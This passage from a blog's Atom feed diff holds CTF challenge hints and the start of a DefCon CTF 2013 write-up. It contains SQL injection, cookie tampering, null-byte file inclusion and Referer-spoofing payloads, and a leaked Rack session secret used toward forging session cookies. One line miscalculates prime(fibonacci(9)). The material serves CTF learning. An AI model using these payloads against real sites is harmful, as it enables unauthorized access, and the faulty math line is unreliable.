-<li>prime(fibonacci(2)) = prime(2) = 3</li>
-<li>prime(fibonacci(3)) = prime(3) = 5</li>
-<li>prime(fibonacci(4)) = prime(5) = 11</li>
-<li>&hellip;</li>
-<li>prime(fibonacci(8)) = prime(55) = 139</li>
-<li>prime(fibonacci(9)) = prime(55) = 257</li>
-</ul>
-
-
-<h2>Script</h2>
-
-<h4>Script 1</h4>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#password&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&quot;javascript&quot;</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>password is <code>javascript</code></p>
-
-<h4>Script 2</h4>
-
-<p>Run this code in javasript console, then check the value of variable <code>password</code>.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="s2">&quot;de9f8caa7ea6fe56830925a124d605d4&quot;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
-</span><span class='line'>    <span class="nx">password</span> <span class="o">+=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">substring</span><span class="p">((</span><span class="nx">i</span><span class="o">%</span><span class="mi">3</span><span class="p">),(</span><span class="nx">i</span><span class="o">%</span><span class="mi">5</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">i</span><span class="o">%</span><span class="mi">3</span><span class="p">));</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Script 3</h4>
-
-<p>Run this code in javasript console, then check the value of variable <code>password</code>.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">keys</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span> <span class="s2">&quot;2&quot;</span><span class="p">,</span> <span class="s2">&quot;3&quot;</span><span class="p">,</span> <span class="s2">&quot;4&quot;</span><span class="p">,</span> <span class="s2">&quot;5&quot;</span><span class="p">,</span> <span class="s2">&quot;6&quot;</span><span class="p">,</span> <span class="s2">&quot;7&quot;</span><span class="p">,</span> <span class="s2">&quot;8&quot;</span><span class="p">,</span> <span class="s2">&quot;9&quot;</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="s2">&quot;C&quot;</span><span class="p">,</span> <span class="s2">&quot;D&quot;</span><span class="p">,</span> <span class="s2">&quot;E&quot;</span><span class="p">,</span> <span class="s2">&quot;F&quot;</span><span class="p">,</span> <span class="s2">&quot;G&quot;</span><span class="p">,</span> <span class="s2">&quot;H&quot;</span><span class="p">,</span> <span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="s2">&quot;J&quot;</span><span class="p">,</span> <span class="s2">&quot;K&quot;</span><span class="p">,</span> <span class="s2">&quot;L&quot;</span><span class="p">,</span> <span class="s2">&quot;M&quot;</span><span class="p">,</span> <span class="s2">&quot;N&quot;</span><span class="p">,</span> <span class="s2">&quot;O&quot;</span><span class="p">,</span> <span class="s2">&quot;P&quot;</span><span class="p">,</span> <span class="s2">&quot;Q&quot;</span><span class="p">,</span> <span class="s2">&quot;R&quot;</span><span class="p">,</span> <span class="s2">&quot;S&quot;</span><span class="p">,</span> <span class="s2">&quot;T&quot;</span><span class="p">,</span> <span class="s2">&quot;U&quot;</span><span class="p">,</span> <span class="s2">&quot;V&quot;</span><span class="p">,</span> <span class="s2">&quot;W&quot;</span><span class="p">,</span> <span class="s2">&quot;X&quot;</span><span class="p">,</span> <span class="s2">&quot;Y&quot;</span><span class="p">,</span> <span class="s2">&quot;Z&quot;</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span><span class="p">,</span> <span class="s2">&quot;c&quot;</span><span class="p">,</span> <span class="s2">&quot;d&quot;</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;f&quot;</span><span class="p">,</span> <span class="s2">&quot;g&quot;</span><span class="p">,</span> <span class="s2">&quot;h&quot;</span><span class="p">,</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="s2">&quot;j&quot;</span><span class="p">,</span> <span class="s2">&quot;k&quot;</span><span class="p">,</span> <span class="s2">&quot;l&quot;</span><span class="p">,</span> <span class="s2">&quot;m&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">,</span> <span class="s2">&quot;o&quot;</span><span class="p">,</span> <span class="s2">&quot;p&quot;</span><span class="p">,</span> <span class="s2">&quot;q&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">,</span> <span class="s2">&quot;s&quot;</span><span class="p">,</span> <span class="s2">&quot;t&quot;</span><span class="p">,</span> <span class="s2">&quot;u&quot;</span><span class="p">,</span> <span class="s2">&quot;v&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">,</span> <span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;y&quot;</span><span class="p">,</span> <span class="s2">&quot;z&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="nx">password</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nx">k</span> <span class="o">=</span> <span class="s2">&quot;17 4 59 0 53 28&quot;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
-</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="k">in</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>    <span class="nx">password</span> <span class="o">+=</span> <span class="nx">keys</span><span class="p">[</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">i</span><span class="p">])];</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<h2>Cryptography</h2>
-
-<h4>Cryptography 1</h4>
-
-<p>The <strong>Salad Cipher</strong>, aka <strong>ROT13</strong></p>
-
-<p>Decryption Key</p>
-
-<pre><code>A|B|C|D|E|F|G|H|I|J|K|L|M
--------------------------
-N|O|P|Q|R|S|T|U|V|W|X|Y|Z
-</code></pre>
-
-<p>letter above equals below, and vice versa</p>
-
-<h4>Cryptography 2</h4>
-
-<p>Try to combine some words using the numbers with T9 IME on a mobile phone.</p>
-
-<table style="text-align: center;">
-<tr><td><p>1</p>&#8217;</td><td><p>2</p>ABC</td><td><p>3</p>DEF</td></tr>
-<tr><td><p>4</p>GHI</td><td><p>5</p>JKL</td><td><p>6</p>MNO</td></tr>
-<tr><td><p>7</p>PQRS</td><td><p>8</p>TUV</td><td><p>9</p>WXYZ</td></tr>
-</table>
-
-
-<h4>Cryptography 3</h4>
-
-<p><strong>Base64</strong> decode it.</p>
-
-<h4>Cryptography 4</h4>
-
-<p><strong>Caesar&rsquo;s Square</strong></p>
-
-<pre><code>TSDLN ILHSY OGSRE WOOFR OPOUK OAAAR RIRID
-</code></pre>
-
-<p>Count the number of letters, here we have 35
-We can put 35 into 5 rows of 7</p>
-
-<pre><code>TSDLNIL
-HSYOGSR
-EWOOFRO
-POUKOAA
-ARRIRID
-</code></pre>
-
-<p>Read it, downwards from the top left, then the next column.</p>
-
-<h4>Cryptography 6</h4>
-
-<p><strong>Morse Alphabet</strong></p>
-
-<h4>Cryptography 7</h4>
-
-<p><strong>ASCII</strong></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#python</span>
-</span><span class='line'><span class="n">text</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s">&#39;84 104 101 32 115 101 99 114 101 116 32 119 111 114 100 32 121 111 117 39 114 101 32 115 101 97 114 99 104 105 110 103 32 102 111 114 32 105 115 32 115 101 99 114 101 116&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)])</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<h4>Cryptography 8</h4>
-
-<p><strong>Atbash</strong> (similar with the Salad Cipher)</p>
-
-<pre><code>A|B|C|D|E|F|G|H|I|J|K|L|M
--------------------------
-Z|Y|X|W|V|U|T|S|R|Q|P|O|N
-</code></pre>
-
-<p>letter above equals below, and vice versa</p>
-
-<p>in another way</p>
-
-<pre><code>Plain:  ABCDEFGHIJKLMNOPQRSTUVWXYZ
-Cipher: ZYXWVUTSRQPONMLKJIHGFEDCBA
-</code></pre>
-
-<h4>Cryptography 9</h4>
-
-<p><strong>Polybius Square</strong></p>
-
-<table>
-<thead>
-    <tr><td>\</td><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr>
-</thead>
-<tbody>
-    <tr><th>1</th><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td></tr>
-    <tr><th>2</th><td>F</td><td>G</td><td>H</td><td>I</td><td>K</td></tr>
-    <tr><th>3</th><td>L</td><td>M</td><td>N</td><td>O</td><td>P</td></tr>
-    <tr><th>4</th><td>Q</td><td>R</td><td>S</td><td>T</td><td>U</td></tr>
-    <tr><th>5</th><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td></tr>
-</tbody>
-</table>
-
-
-<p>Each letter is then represented by its coordinates in the grid. For example, <code>BAT</code> becomes <code>12 11 44</code>. Because 26 characters do not quite fit in a square, it is rounded down to the next lowest square number by combining two letters (usually I and J).</p>
-
-<h4>Cryptography 11</h4>
-
-<p>The index of a letter in the <code>alphabt</code>. 0 indicates a blank.</p>
-
-<h4>Cryptography 13</h4>
-
-<p>A programming language named <strong>BrainFuck</strong>.</p>
-
-<h4>Cryptography 16</h4>
-
-<p>Read it in a human readable way. Starting with the top left <code>T</code>, then <code>H</code> under it, and then <code>E</code> on the right side. Hints in the title <code>clues</code>.</p>
-
-<h4>Cryptography 17</h4>
-
-<p><strong>MD5</strong> ，brute force it with the hint <code>a-z*6</code>, or try cmd5.org.</p>
-
-<h4>Cryptography 22</h4>
-
-<p>Static crypto table with a reverse. the crypto table can be easily dumped.</p>
-
-<pre><code>e7 a4 90 71 36 49 aa e6 5b 3a ef 64 a0 be eb 09 f2 8c 57 ec 8f 74 1f 01 51 98 
-Z  Y  X  W  V  U  T  S  R  Q  P  O  N  M  L  K  J  I  H  G  F  E  D  C  B  A
-
-91 72 61 3f 69 fe 4b fa 85 fd 14 68 73 26 0f ac cc a1 4d db ab 43 46 11 08 b7
-z  y  x  w  v  u  t  s  r  q  p  o  n  m  l  k  j  i  h  g  f  e  d  c  b  a
-
-d8 b0 31 07 cf 8e 45 24 0b 5a
-0  9  8  7  6  5  4  3  2  1
-
-92 35 00 c6 3d 55 96 54 7d f6 e9
-)  (  *  &amp;  ^  %  $  #  @  !   
-
-cb d9 21 3e af 38 8b 4e 9e ea 0a 4c 04 58 6d b6 67 29 13 c5
-?  &gt;  &lt;  "  :  |  }  {  +  _  /  .  ,  '  ;  \  ]  [  =  -
-</code></pre>
-
-<h4>Cryptography 25</h4>
-
-<p><strong>Braille Alphabet</strong></p>
-
-<h2>WEB Based</h2>
-
-<h4>Web 1</h4>
-
-<pre><code>Page=Admin
-</code></pre>
-
-<h4>Web 2</h4>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">// javascript</span>
-</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s1">&#39;isAdmin=1&#39;</span><span class="p">;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Web 3</h4>
-
-<pre><code>/robots.txt
-</code></pre>
-
-<h4>Web 4</h4>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl -H <span class="s1">&#39;Referer: www.google.com&#39;</span> <span class="s1">&#39;http://theurl/Content/Challenges/Web/Web4.php&#39;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Web 5</h4>
-
-<p>Do not waste time on the form because nothing happend when you click the button.</p>
-
-<pre><code>SESSION=abf3e2d32ec32' or '1'='1' --
-</code></pre>
-
-<h4>Web 6</h4>
-
-<p>look around <a href="http://theurl/Content/Challenges/Web/Files6/">http://theurl/Content/Challenges/Web/Files6/</a></p>
-
-<h4>Web 7</h4>
-
-<pre><code>curl -d 'Type=admin' 'http://theurl/Content/Challenges/Web/Web7.php'
-</code></pre>
-
-<h4>Web 8</h4>
-
-<pre><code>Page[]=Home 
-</code></pre>
-
-<p>will trigger a php <code>fatal error</code>, which will display the error stack including the full path of the file in the page.</p>
-
-<h4>Web 9</h4>
-
-<pre><code>File=Files9/passconfigs.php%00
-</code></pre>
-
-<h4>Web 10</h4>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl <span class="s1">&#39;http://theurl/Content/Challenges/Web/Web10.php&#39;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<h2>Microhard</h2>
-
-<h4>CCTV</h4>
-
-<p>Try to find something in the terminal</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">help</span>
-</span><span class='line'><span class="nb">echo </span>learninglog.txt
-</span><span class='line'>apt-get install ***
-</span><span class='line'>ifconfig
-</span><span class='line'>*** 192.***
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Then an open port of a alive host which may be the remote camera.
-Open it in Firefox and then successfully we can get the CCTV admin page.</p>
-
-<p>Try to login with someone&rsquo;s name as the password.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[For Our One Year Anniversary]]></title>
-    <link href="http://xelz.info/blog/2014/04/20/for-our-one-year-anniversary/"/>
-    <updated>2014-04-20T20:00:00+00:00</updated>
-    <id>http://xelz.info/blog/2014/04/20/for-our-one-year-anniversary</id>
-    <content type="html"><![CDATA[<p>I make this page to remember our love.</p>
-
-<p>GitHub: <a href="https://github.com/xelzmm/Love">https://github.com/xelzmm/Love</a></p>
-
-<p>View: <a href="http://iloveyamei.aliapp.com">http://iloveyamei.aliapp.com</a> | <a href="http://love.xelz.info">http://love.xelz.info</a></p>
-
-<p><img src="http://xelz.info/assets/2014/one-year.jpg" alt="" /></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[DefCon CTF Qualifier 2013 3dub 3 Write Up]]></title>
-    <link href="http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up/"/>
-    <updated>2013-06-28T12:00:00+00:00</updated>
-    <id>http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up</id>
-    <content type="html"><![CDATA[<p>mirror of <a href="http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/">http://www.blue-lotus.net/def-con-ctf-qualifier-2013-3dub-3-writeup/</a></p>
-
-<p>First of all, we got a <code>secrets</code> link and <code>log in or create user</code> form. When we create and login, the website redirect us to the &lsquo;secrets&rsquo; page like this</p>
-
-<blockquote><p>Secrets</p>
-
-<p>name owner actions</p>
-
-<p>key admin <a href="#">show</a></p>
-
-<p>nothing asdf <a href="#">show</a></p>
-
-<p><a href="#">new secret</a></p></blockquote>
-
-<p>we&rsquo;ve got some links to see secrets owned by other users, include the <code>admin</code>, or easily add a new secret ourselves.</p>
-
-<p>Having a try to open the admin&rsquo;s secret, we got a 500 Error Page with some error stack, which powered by the Ruby framework <code>Sinatra</code>.</p>
-
-<p>From the very first sight of the page, it said <code>unauthorized</code> as the error message and a piece of source code was provided</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">redirect</span> <span class="s1">&#39;/secrets&#39;</span>
-</span><span class='line'><span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">get</span> <span class="s1">&#39;/secrets/:id&#39;</span> <span class="k">do</span>
-</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">SECRETS</span><span class="o">[</span><span class="n">params</span><span class="o">[</span><span class="ss">:id</span><span class="o">].</span><span class="n">to_i</span><span class="o">]</span>
-</span><span class='line'><span class="k">raise</span> <span class="s2">&quot;unauthorized&quot;</span> <span class="k">if</span> <span class="n">session</span><span class="o">[</span><span class="ss">:user_name</span><span class="o">]</span> <span class="o">!=</span> <span class="n">s</span><span class="o">.</span><span class="n">username</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">haml</span> <span class="ss">:secret</span><span class="p">,</span> <span class="ss">locals</span><span class="p">:</span> <span class="p">{</span><span class="ss">secret</span><span class="p">:</span> <span class="n">s</span><span class="p">}</span>
-</span><span class='line'><span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">helpers</span> <span class="k">do</span>
-</span><span class='line'><span class="k">def</span> <span class="nf">current_user</span>
-</span><span class='line'>    <span class="k">return</span> <span class="kp">nil</span> <span class="k">unless</span> <span class="n">session</span><span class="o">[</span><span class="ss">:user_name</span><span class="o">]</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<!-- more -->
-
-
-<p>It meant that I&rsquo;m not the secret&rsquo;s holder. then have a look at the whole page, and you would find some environment variable in the <code>Rack ENV</code> section, partly like</p>
-
-<ul>
-<li>rack.session</li>
-</ul>
-
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;session_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a&quot;</span><span class="p">,</span> <span class="s2">&quot;tracking&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_ENCODING&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ed2b3ca90a4e723402367a1d17c8b28392842398&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6&quot;</span><span class="p">},</span> <span class="s2">&quot;csrf&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6&quot;</span><span class="p">,</span> <span class="s2">&quot;user_name&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;test&quot;</span><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>rack.session.options</li>
-</ul>
-
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="ss">:path</span><span class="o">=&gt;</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="ss">:domain</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span> <span class="ss">:expire_after</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span> <span class="ss">:secure</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:httponly</span><span class="o">=&gt;</span><span class="kp">true</span><span class="p">,</span> <span class="ss">:defer</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:renew</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span> <span class="ss">:sidbits</span><span class="o">=&gt;</span><span class="mi">128</span><span class="p">,</span> <span class="ss">:secure_random</span><span class="o">=&gt;</span><span class="no">SecureRandom</span><span class="p">,</span> <span class="ss">:secret</span><span class="o">=&gt;</span><span class="s2">&quot;wroashsoxDiculReejLykUssyifabEdGhovHabno&quot;</span><span class="p">,</span> <span class="ss">:coder</span><span class="o">=&gt;</span><span class="c1">#}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>rack.session.unpacked_cookie_data</li>
-</ul>
-
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;session_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a&quot;</span><span class="p">,</span> <span class="s2">&quot;tracking&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;HTTP_USER_AGENT&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_ENCODING&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ed2b3ca90a4e723402367a1d17c8b28392842398&quot;</span><span class="p">,</span> <span class="s2">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6&quot;</span><span class="p">},</span> <span class="s2">&quot;csrf&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6&quot;</span><span class="p">,</span> <span class="s2">&quot;user_name&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;test&quot;</span><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>rack.request.cookie_hash</li>
-</ul>
-
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;rack.session&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj</span><span class="se">\n</span><span class="s2">YjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki</span><span class="se">\n</span><span class="s2">DXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm</span><span class="se">\n</span><span class="s2">OWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND</span><span class="se">\n</span><span class="s2">RVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj</span><span class="se">\n</span><span class="s2">OGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0</span><span class="se">\n</span><span class="s2">YWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG</span><span class="se">\n</span><span class="s2">OwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx</span><span class="se">\n</span><span class="s2">YWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl</span><span class="se">\n</span><span class="s2">c3QGOwBU</span><span class="se">\n</span><span class="s2">--d637305e23d6693f3ebe276b292293c7ff0b72e6&quot;</span><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>we&rsquo;ve got some message:</p>
-
-<p>the cookie <code>rack.session</code> is some way encoded of <code>rack.session.unpacked_cookie_data</code>, which is totally the same as env variable rack.session, and the coder mybe <code>Rack::Session::Cookie::Base64::Marshal</code>, secret (if any) maybe <code>wroashsoxDiculReejLykUssyifabEdGhovHabno</code></p>
-
-<p>By seeking the source code of rack, we found this <a href="https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb">https://github.com/rack/</a></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="vi">@secrets</span> <span class="o">=</span> <span class="n">options</span><span class="o">.</span><span class="n">values_at</span><span class="p">(</span><span class="ss">:secret</span><span class="p">,</span> <span class="ss">:_old_secret</span><span class="p">)</span><span class="o">.</span><span class="n">compact</span>
-</span><span class='line'><span class="c1"># some code else</span>
-</span><span class='line'><span class="n">session_data</span> <span class="o">=</span> <span class="n">coder</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
-</span><span class='line'><span class="k">if</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">first</span>
-</span><span class='line'>    <span class="n">session_data</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;--</span><span class="si">#{</span><span class="n">generate_hmac</span><span class="p">(</span><span class="n">session_data</span><span class="p">,</span> <span class="vi">@secrets</span><span class="o">.</span><span class="n">first</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
-</span><span class='line'><span class="k">end</span>
-</span><span class='line'><span class="c1"># some code else</span>
-</span><span class='line'><span class="k">def</span> <span class="nf">generate_hmac</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
-</span><span class='line'>    <span class="no">OpenSSL</span><span class="o">::</span><span class="no">HMAC</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(</span><span class="no">OpenSSL</span><span class="o">::</span><span class="no">Digest</span><span class="o">::</span><span class="no">SHA1</span><span class="o">.</span><span class="n">new</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
